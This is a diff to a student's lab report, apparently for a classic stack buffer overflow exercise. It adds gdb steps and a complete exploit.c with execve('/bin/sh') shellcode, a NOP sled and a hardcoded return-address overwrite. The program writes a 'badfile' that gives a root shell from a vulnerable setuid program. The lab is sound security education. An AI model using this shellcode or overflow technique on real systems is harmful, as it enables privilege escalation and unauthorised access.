@@ -510,9 +510,9 @@
 
 #### Set Up
 
-* Compile the `stack.c`
+* Compile the `stack.c` (**Important to add the option `-g`**)
 
-  ![Screen Shot 2020-03-13 at 9.07.06 PM](assets/Screen Shot 2020-03-13 at 9.07.06 PM.png)
+  ![1584120853855](assets/1584120853855.png)
 
 #### Task A: Distance Between Buffer Base Address and Return Address
 
@@ -524,13 +524,68 @@
 
   ![Screen Shot 2020-03-13 at 9.21.28 PM](assets/Screen Shot 2020-03-13 at 9.21.28 PM.png)
 
-#### TaskB: Address of Malicious Code
+  * The distance is `0x29 + 4 = 45(decimal)`
+
+#### Task B: Address of Malicious Code
+
+* Set the break point to be `main`, stop at the line run `fread`
+
+  ![1584121007411](assets/1584121007411.png)
 
 * Find the address of malicious code
 
-  ![Screen Shot 2020-03-13 at 10.24.33 PM](assets/Screen Shot 2020-03-13 at 10.24.33 PM.png)
+  ![1584121033072](assets/1584121033072.png)
 
-* 
+* Write the **code** according to the instruction in the tutorial
+
+  ```c
+  /* exploit.c */
+  /* A program that creates a file containing code for launching shell*/
+  #include <stdlib.h>
+  #include <stdio.h>
+  #include <string.h>
+  
+  char shellcode[]=
+  	"\x31\xc0" /* xorl %eax,%eax */
+  	"\x50" /* pushl %eax */
+  	"\x68""//sh" /* pushl $0x68732f2f */
+  	"\x68""/bin" /* pushl $0x6e69622f */
+  	"\x89\xe3" /* movl %esp,%ebx */
+  	"\x50" /* pushl %eax */
+  	"\x53" /* pushl %ebx */
+  	"\x89\xe1" /* movl %esp,%ecx */
+  	"\x99" /* cdq */
+  	"\xb0\x0b" /* movb $0x0b,%al */
+  	"\xcd\x80" /* int $0x80 */
+  ;
+  
+  int main(int argc, char **argv)
+  {
+  	char buffer[517];
+  	FILE *badfile;
+  	/* Initialize buffer with 0x90 (NOP instruction) */
+  	memset(&buffer, 0x90, 517);
+  	/* You need to fill the buffer with appropriate contents here */
+  	*((long *) (buffer + (41+4))) = 0xbfffeae7+ 0x80;
+  	memcpy(buffer + sizeof(buffer) - sizeof(shellcode), shellcode, sizeof(shellcode));
+  	/* Save the contents to the file "badfile" */
+  	badfile = fopen("./badfile", "w");
+  	fwrite(buffer, 517, 1, badfile);
+  	fclose(badfile);
+  	return 0;
+  }
+  ```
+
+* Result:
+
+  ![1584121139905](assets/1584121139905.png)
+
+* Explanation: 
+
+  * Firstly, we found the distance of the buffer and the `$ebp` is `41` and we know that `ret=$ebp+4`, therefore, we know that the return address can be represented as `*(buffer+45)` 
+  * Secondly, we found that the address of `str` is `0xbfffeae7`
+  * Therefore, by setting the return address to the one of the entry in the front of `str`, we can change the flow of the program to `nop` as initialized in `exploit.c`. Then it will do nothing until reach the shellcode stored at the end of `str`. 
+  * The shellcode will be executed and extend the root privilege. 
 
 ### 3.5 Defeating dash’s Countermeasure
 
